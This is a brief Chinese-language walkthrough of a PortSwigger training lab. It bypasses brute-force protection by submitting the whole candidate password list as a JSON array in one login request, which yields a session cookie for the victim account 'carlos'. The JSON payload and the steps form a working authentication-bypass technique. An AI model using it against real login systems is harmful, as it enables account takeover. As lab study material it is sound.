# 实验：破损的暴力破解保护，每个请求多个凭据

由于其暴力破解保护中存在逻辑缺陷，本实验存在漏洞。为了解决本实验，请暴力破解 Carlos 的密码，然后访问他的账户页面。

-   受害者用户名：`carlos`
-   [候选密码](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## 步骤

尝试提交密码
- 请求
    ```http
    POST /login HTTP/2

    {"username":"a","password":"a"}
    ```
    - 此处使用 json 格式


- 尝试在 json 中设置密码列表
    ```json
    {
        "username":"carlos",
        "password":[
            "123456",
            "abc"
        ]
    }
    ```
    - 并未触发测试过程中格式错误的 500 响应，返回了普通登录错误信息

- 尝试将所有密码字典项放入 JSON 的密码字段列表中
    - 服务器返回 302 响应，并设置 cookie
    - 在浏览器设置 cookie 后成功以目标用户身份登录
